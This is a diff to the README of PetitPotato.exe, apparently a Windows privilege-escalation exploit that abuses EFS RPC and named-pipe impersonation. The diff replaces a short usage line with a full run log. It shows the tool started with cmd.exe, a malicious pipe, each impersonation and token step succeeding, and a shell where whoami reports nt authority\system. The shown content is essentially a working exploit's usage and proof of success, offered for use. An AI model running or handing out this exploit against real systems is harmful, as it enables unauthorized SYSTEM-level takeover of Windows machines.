@@ -49,13 +49,28 @@ PetitPotato.exe [EfsID] [Command]
 
 ## Example
 
-```powershell
-PetitPotato.exe 3 whoami
+```cmd
+C:\Users\Administrator\Desktop>PetitPotato.exe 3 cmd.exe
+
+[+] Malicious named pipe running on \\.\pipe\petit\pipe\srvsvc.
+[+] Invoking EfsRpcQueryUsersOnFile with target path: \\localhost/pipe/petit\C$\wh0nqs.txt.
+[+] The connection is successful.
+[+] ImpersonateNamedPipeClient OK.
+[+] OpenThreadToken OK.
+[+] DuplicateTokenEx OK.
+[+] CreateProcessAsUser OK.
+Microsoft Windows [版本 10.0.18363.592]
+(c) 2019 Microsoft Corporation。保留所有权利。
+
+C:\Windows\system32>whoami
+nt authority\system
+
+C:\Windows\system32>
 ```
 
-![image-20220422114209110](/images/image-20220422114209110.png)
+![image-20221030165055659](.\images\image-20221030165055659.png)
 
-![image-20220422132713870](/images/image-20220422132713870.png)
+![image-20221030165622668](.\images\image-20221030165622668.png)
 
 ## Link
 
